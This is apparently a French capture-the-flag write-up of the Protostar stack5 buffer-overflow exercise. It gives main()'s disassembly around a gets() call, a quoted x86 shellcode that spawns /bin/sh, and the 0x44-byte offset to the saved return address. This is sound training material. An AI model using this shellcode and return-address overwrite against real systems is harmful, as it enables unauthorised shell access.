# Stack5

[https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/](https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/)

	0x080483c4 <main+0>:	push   ebp
	0x080483c5 <main+1>:	mov    ebp,esp
	0x080483c7 <main+3>:	and    esp,0xfffffff0
	0x080483ca <main+6>:	sub    esp,0x50
	0x080483cd <main+9>:	lea    eax,[esp+0x10]
	0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
	0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
	0x080483d9 <main+21>:	leave  
	0x080483da <main+22>:	ret  

Représentation:

![](stack1.png)

![](stack2.png)

![](stack3.png)

![](stack4.png)

![](stack5.png)

![](stack6.png)

Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-827.php)
, on trouve un exploit:

	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

Il faut:
* injecter le code de l'exploit dans le processus.
* modifier la case mémoire qui contient l'adresse de retour de la fonction `main()` afin. Il faut y injecter l'adresse du code qui contient l'exploit.

La case mémoire qui contient l'adresse de retour de la fonction `main()` se situe à `x + 0x44` octets de la variable `buffer`.


